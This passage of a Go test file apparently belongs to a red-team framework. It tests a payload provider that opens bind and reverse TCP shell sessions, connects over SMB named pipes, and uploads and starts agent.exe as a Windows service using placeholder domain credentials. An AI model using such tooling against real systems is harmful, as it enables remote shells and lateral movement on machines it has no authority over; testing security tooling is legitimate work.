		t.Fatalf("completion output = %q, want squatterctl suggestions", completion)
	}

	var closeResult struct {
		Status string `json:"status"`
	}
	rpc.Call("session/close", map[string]any{"sessionId": sessionID, "reason": "test"}, &closeResult)
	if closeResult.Status != "ok" {
		t.Fatalf("close result = %#v", closeResult)
	}
}

func TestProviderExecuteConnectTCPBindProducesSessionCapability(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	accepted := make(chan net.Conn, 1)
	go func() {
		conn, err := listener.Accept()
		if err == nil {
			accepted <- conn
		}
	}()
	port := listener.Addr().(*net.TCPAddr).Port

	result, err := newProvider().ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.connect_tcp_bind",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":        "127.0.0.1",
				"payload.transport":  tcpBind,
				"payload.bind_port":  strconv.Itoa(port),
				"session.connect_ms": "1000",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("status = %q", result.Status)
	}
	if len(result.Capabilities) != 1 || result.Capabilities[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("capabilities = %#v, want SessionRef", result.Capabilities)
	}
	if len(result.Sessions) != 1 || result.Sessions[0].Transport != "squatter/tcp-bind" {
		t.Fatalf("sessions = %#v, want tcp-bind session", result.Sessions)
	}
	if result.Capabilities[0].Attributes["transport"] != tcpBind {
		t.Fatalf("session capability attributes = %#v", result.Capabilities[0].Attributes)
	}
	select {
	case conn := <-accepted:
		closeTestConn(t, "accepted connection", conn)
	case <-time.After(time.Second):
		t.Fatal("bind listener did not receive provider connection")
	}
}

func TestProviderExecuteTCPCallbackAdoptsAcceptedConnection(t *testing.T) {
	provider := newProvider()
	listen, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.listen_tcp_callback",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "target-1",
				"payload.transport": tcpCallback,
				"payload.lhost":     "127.0.0.1",
				"payload.lport":     "0",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if listen.Status != "succeeded" || len(listen.Capabilities) == 0 {
		t.Fatalf("listen result = %#v", listen)
	}
	portText, ok := listen.Capabilities[0].Attributes["port"].(string)
	if !ok || portText == "" {
		t.Fatalf("listener capability = %#v", listen.Capabilities[0])
	}
	port, err := strconv.Atoi(portText)
	if err != nil {
		t.Fatal(err)
	}
	conn, err := net.Dial("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(port)))
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestConn(t, "connection", conn)
	if _, err := conn.Write([]byte{'S', 'Q', 'U', 'A', 'T', 'T', 'E', 'R', 0x01, 0x00, 0x00, 0x00}); err != nil {
		t.Fatal(err)
	}

	connect, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.connect_tcp_callback",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "target-1",
				"payload.transport": tcpCallback,
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if connect.Status != "succeeded" {
		t.Fatalf("connect result = %#v", connect)
	}
	if len(connect.Capabilities) != 1 || connect.Capabilities[0].Attributes["transport"] != tcpCallback {
		t.Fatalf("session capability = %#v", connect.Capabilities)
	}
	if len(connect.Sessions) != 1 || connect.Sessions[0].Transport != "squatter/tcp-callback" {
		t.Fatalf("sessions = %#v, want tcp-callback session", connect.Sessions)
	}
}

func TestProviderExecuteConnectSMBProducesSessionCapability(t *testing.T) {
	connector := &fakeSMBConnector{conn: noopReadWriteCloser{}}
	lp := newPlaceholderLP()
	lp.smb = connector
	provider := Provider{lp: lp}

	result, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.connect_smb",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "192.0.2.20",
				"payload.transport": smbNamedPipe,
				"payload.pipe":      "pipe123",
				"smb.username":      "user123",
				"smb.password":      "pass123",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("status = %q", result.Status)
	}
	if len(result.Capabilities) != 1 || result.Capabilities[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("capabilities = %#v, want SessionRef", result.Capabilities)
	}
	if len(result.Sessions) != 1 || result.Sessions[0].Transport != "squatter/smb-named-pipe" {
		t.Fatalf("sessions = %#v, want smb session", result.Sessions)
	}
	if result.Capabilities[0].Attributes["transport"] != smbNamedPipe {
		t.Fatalf("session capability attributes = %#v", result.Capabilities[0].Attributes)
	}
	if len(connector.requests) != 1 || connector.requests[0].Host != "192.0.2.20" {
		t.Fatalf("smb requests = %#v", connector.requests)
	}
}

func TestProviderExecuteInstallSMBUploadsAndStartsWithCredentials(t *testing.T) {
	installer := &fakeSMBInstaller{result: smbInstallResult{
		RemotePath:    `C:\Windows\Temp\agent.exe`,
		ServiceName:   "svc123",
		BinaryPath:    `"C:\Windows\Temp\agent.exe"`,
		BytesWritten:  1234,
		ServiceStatus: 0,
	}}
	provider := Provider{lp: newPlaceholderLP(), installSMB: installer.InstallSMB}

	result, err := provider.ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.install_smb",
		ConfirmedPreparedValues: map[string]any{
			"staged_path":  `C:\Windows\Temp\agent.exe`,
			"service_name": "svc123",
			"pipe_name":    "pipe123",
		},
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":  "192.0.2.20",
				"smb.username": "user123",
				"smb.password": "pass123",
				"smb.domain":   "LAB",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("result = %#v", result)
	}
	if len(installer.requests) != 1 {
		t.Fatalf("installer requests = %#v, want one", installer.requests)
	}
	request := installer.requests[0]
	if request.Host != "192.0.2.20" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
		t.Fatalf("install request = %#v", request)
	}
	if request.RemotePath != `C:\Windows\Temp\agent.exe` || request.ServiceName != "svc123" || request.PipeName != "pipe123" {
		t.Fatalf("install target values = %#v", request)
	}
	if len(request.Payload) == 0 || !bytes.HasPrefix(request.Payload, []byte("MZ")) {
		t.Fatalf("payload bytes = %d, prefix % x", len(request.Payload), request.Payload[:min(len(request.Payload), 2)])
	}
	configOffset := mustPayloadConfigOffset(t, request.Payload)
	if got := binary.LittleEndian.Uint32(request.Payload[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
		t.Fatalf("payload transport kind = %d", got)
	}
	if !bytes.Contains(request.Payload[configOffset:], []byte{'p', 0, 'i', 0, 'p', 0, 'e', 0, '1', 0, '2', 0, '3', 0}) {
		t.Fatal("payload uploaded by installer does not contain UTF-16LE pipe123")
	}
	if len(result.Capabilities) != 3 {
		t.Fatalf("capabilities = %#v", result.Capabilities)
	}
	if result.Capabilities[0].State != "installed" || result.Capabilities[1].State != "active" {
		t.Fatalf("capability states = %#v", result.Capabilities)
	}
	if len(result.InstalledPayloads) != 1 {
		t.Fatalf("installed payloads = %#v, want one descriptor", result.InstalledPayloads)
	}
	installed := result.InstalledPayloads[0]
	if installed.Provider != payloadName || installed.PayloadID != "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe" || installed.State != "installed" {
		t.Fatalf("installed descriptor = %#v", installed)
	}
	if !installed.SupportsReconnect || !installed.SupportsMultipleSessions || installed.Reconnect == nil || installed.Cleanup == nil {
		t.Fatalf("installed descriptor reconnect/cleanup = %#v", installed)
	}
	if installed.Reconnect.Descriptor["payload.pipe"] != `\\.\pipe\pipe123` {
		t.Fatalf("reconnect descriptor = %#v", installed.Reconnect.Descriptor)
	}
}

func mustPayloadConfigOffset(t *testing.T, body []byte) int {
	t.Helper()
	offset, err := payloadConfigOffset(body)
	if err != nil {
		t.Fatal(err)
	}
	return offset
}

func writeUTF16At(body []byte, offset int, value string) {
	for index, code := range utf16.Encode([]rune(value)) {
		binary.LittleEndian.PutUint16(body[offset+(index*2):], code)
	}
}

func writeRPCSession(t *testing.T, conn *hoveltest.RPCConn, sessionID string, data string) {
	t.Helper()
	var result struct {
		Status string `json:"status"`
	}
	conn.Call("session/write", map[string]any{
		"sessionId": sessionID,
		"data":      base64.StdEncoding.EncodeToString([]byte(data)),
	}, &result)
	if result.Status != "ok" {
		t.Fatalf("session/write result = %#v", result)
	}
}

func readRPCSessionUntil(t *testing.T, conn *hoveltest.RPCConn, sessionID string, needle string, timeout time.Duration) string {
	t.Helper()
	deadline := time.Now().Add(timeout)
	var out strings.Builder
	for time.Now().Before(deadline) {
		var chunk struct {
			Data string `json:"data"`
		}
		conn.Call("session/read", map[string]any{"sessionId": sessionID, "timeoutMs": 100}, &chunk)
		decoded, err := base64.StdEncoding.DecodeString(chunk.Data)
		if err != nil {
			t.Fatal(err)
		}
		out.Write(decoded)
		if strings.Contains(out.String(), needle) {
			return out.String()
		}
	}
	t.Fatalf("timed out waiting for %q in %q", needle, out.String())
	return ""
}

type fakeSMBConnector struct {
	requests []smbConnectOptions
	conn     io.ReadWriteCloser
	err      error
}

func (c *fakeSMBConnector) ConnectSMB(_ hovel.ConnectSessionRequest, opts smbConnectOptions) (io.ReadWriteCloser, error) {
	c.requests = append(c.requests, opts)
	if c.err != nil {
		return nil, c.err
	}
	return c.conn, nil
}

type noopReadWriteCloser struct{}

func (noopReadWriteCloser) Read([]byte) (int, error)    { return 0, io.EOF }
func (noopReadWriteCloser) Write(p []byte) (int, error) { return len(p), nil }
func (noopReadWriteCloser) Close() error                { return nil }

type fakeSMBInstaller struct {
	requests []smbInstallOptions
	result   smbInstallResult
	err      error
}

func (i *fakeSMBInstaller) InstallSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
	i.requests = append(i.requests, opts)
	if i.err != nil {
		return smbInstallResult{}, i.err
	}
	return i.result, nil
}

func closeTestConn(t *testing.T, name string, conn net.Conn) {
	t.Helper()
	if err := conn.Close(); err != nil {
		t.Logf("close %s: %v", name, err)
	}
}

func closeTestListener(t *testing.T, listener net.Listener) {
	t.Helper()
	if err := listener.Close(); err != nil {
		t.Logf("close listener: %v", err)
	}
}
